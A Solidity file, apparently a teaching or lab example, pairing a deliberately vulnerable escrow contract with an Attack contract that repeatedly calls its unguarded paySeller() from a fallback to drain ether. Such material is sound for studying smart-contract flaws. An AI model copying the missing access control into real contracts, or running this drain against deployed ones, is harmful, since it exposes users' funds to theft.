// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

contract Escrow_client_1a_vuln {
    address public buyer;
    address public seller;
    address public owner;
    uint buyerOffer;

    constructor() {
        buyer = msg.sender;
        owner = msg.sender;
    }

    function addSeller(address sellerInput) external payable {
        require(msg.value > 0, '** Offer price must be above zero **');
        seller = sellerInput;
        buyerOffer = msg.value;
    }

    function paySeller() external {
        payable(msg.sender).transfer(buyerOffer);
    }

    function deposit() public payable {
        buyerOffer = msg.value;
    }
}

contract Attack {
    Escrow_client_1a_vuln public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = Escrow_client_1a_vuln(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
//        if (etherStore.buyerOffer >= 1 ether) {
            etherStore.paySeller();
//        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
//        etherStore.deposit{value: 1 ether}();
        etherStore.paySeller();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
